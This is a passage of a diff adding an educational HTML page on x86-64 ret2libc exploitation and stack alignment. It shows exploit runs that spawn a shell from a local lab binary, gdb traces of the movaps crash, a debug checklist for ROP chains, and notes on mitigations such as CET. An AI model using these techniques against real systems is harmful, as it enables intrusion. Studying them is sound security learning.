+p.stdin.write(b"id; echo SHELL_OK\n");  p.stdin.flush()
+print(p.communicate(timeout=5)[0].decode())</code></pre>
+</div>
+
+<div class="panel">
+  <h3>Misaligned run <span class="hint">the crash everyone hits</span></h3>
+<pre><code>$ python3 exp.py noalign
+  (no output)   rc = -11   &#8594; SIGSEGV
+
+$ gdb -q -batch -ex "run &lt; pay_noalign" -ex "info registers rsp" -ex "x/i \$rip" ./vuln
+ #0  0x7ffff7c5843b &#8594; do_system(line=0x404030 &lt;cmd&gt; "/bin/sh")   &#8592; rdi was perfect!
+ reason: SIGSEGV
+ rsp            0x7fffffffd318
+=&gt; 0x7ffff7c5843b &lt;do_system+363&gt;:  movaps XMMWORD PTR [rsp+0x50],xmm0</code></pre>
+  <div class="callout red"><code>0x7fffffffd318</code> &#8212; the low nibble is <code>8</code>, so <code>rsp % 16 == 8</code> and <code>[rsp+0x50] % 16 == 8</code>. Exactly the prediction from section 4. Note that gdb even printed the argument correctly: <b>the chain worked, the ABI did not.</b></div>
+</div>
+
+<div class="panel">
+  <h3>Aligned run <span class="hint">same payload, one qword longer</span></h3>
+<pre><code>$ gdb -q -batch -ex "run &lt; pay_align" ./vuln
+ process 670047 is executing new program: /usr/bin/dash
+
+$ python3 exp.py align
+ uid=1000(smalinux) gid=1000(smalinux) groups=1000(smalinux),4(adm),24(cdrom),27(sudo),...
+ SHELL_OK</code></pre>
+  <div class="callout green">The parent still reports <code>rc = -11</code> afterwards, and that is expected: once the shell exits, <code>system()</code> returns into whatever follows your chain &#8212; here, into <code>'A'</code> padding. Append <code>&amp;exit</code> (or a <code>pop rdi; ret</code> + <code>0</code> + <code>&amp;exit</code>) if you want a clean teardown.</div>
+</div>
+
+<h2 class="sec" id="debug"><span class="n c7">7</span> Debug checklist <span class="hint">symptom &#8594; cause</span></h2>
+
+<div class="panel">
+  <table class="ref">
+    <tr><th>Symptom</th><th>Most likely cause</th><th>Next step</th></tr>
+    <tr><td>SIGSEGV on <code>movaps</code> / <code>movdqa</code> inside libc, arguments look right</td><td>stack misaligned at the libc entry</td><td>add (or remove) one <code>ret</code> gadget; verify <code>p $rsp % 16</code> at the function&#8217;s first instruction &#8212; you want <b>8</b></td></tr>
+    <tr><td>SIGSEGV inside <code>_dl_runtime_resolve</code></td><td>same disease, different victim: the lazy-binding trampolines spill SSE state with alignment-sensitive instructions (<code>movaps</code>, <code>fxsave</code>, <code>xsavec</code>) &#8212; grep your <code>ld-linux-x86-64.so.2</code> for them</td><td>align, or call through a resolved GOT entry instead of a PLT stub</td></tr>
+    <tr><td>Works in gdb, dies outside</td><td>gdb disables ASLR and adds its own environment &#8212; the stack address, hence its alignment, differs</td><td><code>set disable-randomization off</code>; match <code>env</code>, <code>argv[0]</code> length and cwd</td></tr>
+    <tr><td><code>one_gadget</code> address does nothing</td><td>its constraints were not met (<code>rsp &amp; 0xf == 0</code>, <code>rax == NULL</code>, <code>[rsp+0x40] == NULL</code> &#8230;)</td><td>read the printed constraints; each one is literally a precondition, alignment included</td></tr>
+    <tr><td>Chain dies immediately at the first gadget</td><td>wrong padding, or the gadget address is stale (ASLR / wrong libc)</td><td>confirm offset with a cyclic pattern; <code>ldd ./vuln</code> and hash the libc you built offsets from</td></tr>
+    <tr><td>Shell opens, then the process crashes</td><td>nothing is wrong &#8212; <code>system()</code> returned into padding</td><td>terminate the chain with <code>exit</code> if it matters</td></tr>
+  </table>
+</div>
+
+<div class="panel">
+  <h3>Quick gdb probes</h3>
+<pre><code>(gdb) b *system                 # or: b *&amp;__libc_system
+(gdb) p $rsp % 16               # 8 = ABI-correct, 0 = you will die on movaps
+(gdb) p/x $rsp &amp; 0xf
+(gdb) x/i $rip                  # where exactly did it blow up
+(gdb) info proc mappings        # NX? which libc? what base?
+(gdb) set disable-randomization off</code></pre>
+</div>
+
+<div class="callout pink"><b>Why this is a 64-bit-only rite of passage.</b> On 32-bit the classic three-word ret2libc passes arguments on the stack and glibc&#8217;s 32-bit <code>system</code> rarely touches aligned SSE stores, so a misaligned chain usually just works. Move to x86-64 and the same payload shape suddenly needs gadgets <i>and</i> parity &#8212; which is why &#8220;add a <code>ret</code>&#8221; is folklore in every ROP Emporium writeup.</div>
+
+<div class="callout blue"><b>What actually stops ret2libc</b> (alignment is not a mitigation): ASLR + no info leak; full RELRO against GOT overwrites; stack canaries against the overflow itself; and Intel CET &#8212; shadow stacks make a forged return address detectable, and IBT requires <code>endbr64</code> at indirect targets. The <code>endbr64</code> at <code>58750</code> in the listing above is CET groundwork already shipping in your libc.</div>
+
+<div class="footer">
+  Part of <a href="https://github.com/smalinux/notes-goblin">notes-goblin</a> &#129484; &#183; created 2026-10-08 &#183;
+  measured on Ubuntu 24.04, glibc 2.39, x86-64 &#183;
+  see also <a href="aslr-memory-layout.html">ASLR off vs on</a>, <a href="stack-visualizer.html">stack visualizer</a>, <a href="heap-poison-null-byte.html">poison NULL byte</a>
+</div>
+
+</div>
+</body>
+</html>
